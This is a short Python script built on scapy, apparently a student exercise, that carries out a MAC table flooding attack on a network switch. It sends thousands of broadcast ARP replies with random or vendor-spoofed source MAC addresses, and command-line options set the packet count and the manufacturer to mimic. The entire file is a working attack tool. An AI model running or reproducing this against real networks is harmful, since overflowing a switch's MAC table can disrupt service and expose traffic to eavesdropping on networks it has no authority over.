import math
import argparse

from scapy.all import sendp, sendpfast, Ether, IP, RandIP, RandMAC, TCP, IP, send, ARP

import json
from pprint import pprint

def getRandomMacAddress(selectedManufacturerId=None):
    if selectedManufacturerId == None:
        return str(RandMAC())
    else:
        return selectedManufacturerId + ':' + ':'.join(RandMAC("*:*:*:*:*:*").split(':')[3:])


def getSpecificManufacturer(iptManufacturer="Samsung"):

    with open('mac-vendor-list.json') as f:
        vendor_list = json.load(f)


    seletecManufacturerName = None
    selectedManufacturerId = None

    for mac_vendor in vendor_list:
        manufacturer_mac_id = mac_vendor["mac"]
        manufacturer_name = mac_vendor["vendor"]
        if iptManufacturer.lower() in manufacturer_name.lower():
            selectedManufacturerId = manufacturer_mac_id[:2].lower() + ':' + manufacturer_mac_id[2:4].lower() + ':' + manufacturer_mac_id[4:].lower() 
            seletecManufacturerName = manufacturer_name.strip()

    return selectedManufacturerId, seletecManufacturerName

def startAttack(selectedManufacturerId=None, packet_count=20000):
    packet_list = []		
    destMAC = "FF:FF:FF:FF:FF:FF"
    print('Initiating packet sending')

    for i in range(0, packet_count):
        packet  = Ether(src = getRandomMacAddress(selectedManufacturerId),dst= RandMAC())
        sendp(Ether(src=getRandomMacAddress(selectedManufacturerId) ,dst=destMAC)/
	    ARP(op=2, psrc="0.0.0.0", hwdst=destMAC),verbose=0)



        packet_list.append(packet)
    return packet_list


def main():

    print('<1505105>')
    print('MAC table flooding attack (of the switch)')
    parser = argparse.ArgumentParser(description="MAC table flooding attack (of the switch)")
    parser.add_argument('-m', '--manufacturer', type=str, required=False, default=None,  help='Switch manufacturer name')
    parser.add_argument('-c', '--count', type=int, default=20000,
		help="Number of packets to be sent (containing fake source MAC addresses)")
    args = parser.parse_args()
    

    selectedManufacturerId , seletecManufacturerName = None, None

    if args.manufacturer != None:
        selectedManufacturerId , seletecManufacturerName=getSpecificManufacturer(args.manufacturer)
    
    if seletecManufacturerName != None:
        print("Selected manufacturer: " + seletecManufacturerName)
    else:
        print('No specific manufacturer selected')

    startAttack(selectedManufacturerId, args.count)
     
    
    

    

if __name__ == "__main__":
    exit(main())


